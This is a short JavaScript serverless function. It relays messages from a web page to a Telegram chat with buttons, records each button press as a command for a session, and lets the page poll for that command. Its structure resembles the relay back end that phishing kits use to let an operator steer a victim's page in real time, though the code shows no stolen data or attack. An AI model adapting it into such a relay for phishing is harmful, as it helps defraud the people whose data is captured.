const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

let sessions = {};

exports.handler = async function(event, context) {
    if (event.httpMethod === 'POST') {
        try {
            const body = JSON.parse(event.body);

            // Webhook event from Telegram (Button Click)
            if (body.callback_query) {
                const callbackData = body.callback_query.data;
                const callbackId = body.callback_query.id;
                
                const [command, sessionId] = callbackData.split(':');

                if (sessionId && command) {
                    sessions[sessionId] = command;

                    // This dismisses the loading state on the button and shows a toast notification on Telegram.
                    // By not calling editMessageText, the buttons and original text are strictly preserved.
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: `Command '${command}' sent successfully!`,
                            show_alert: false
                        })
                    });
                }
                return { statusCode: 200, body: 'OK' };
            }

            // Frontend submission listener
            if (body.message && body.sessionId) {
                const { message, sessionId, keyboard } = body;
                sessions[sessionId] = 'PENDING';

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        reply_markup: keyboard
                    })
                });

                return {
                    statusCode: 200,
                    body: JSON.stringify({ success: true, sessionId })
                };
            }

        } catch (error) {
            console.error("Function Error:", error);
            return { statusCode: 500, body: JSON.stringify({ error: error.message }) };
        }
    }

    // Frontend session polling
    if (event.httpMethod === 'GET') {
        const sessionId = event.queryStringParameters.sessionId;
        if (sessionId) {
            const status = sessions[sessionId] || 'PENDING';
            return {
                statusCode: 200,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ status })
            };
        }
        return { statusCode: 400, body: JSON.stringify({ error: 'Missing sessionId' }) };
    }

    return { statusCode: 405, body: 'Method Not Allowed' };
};
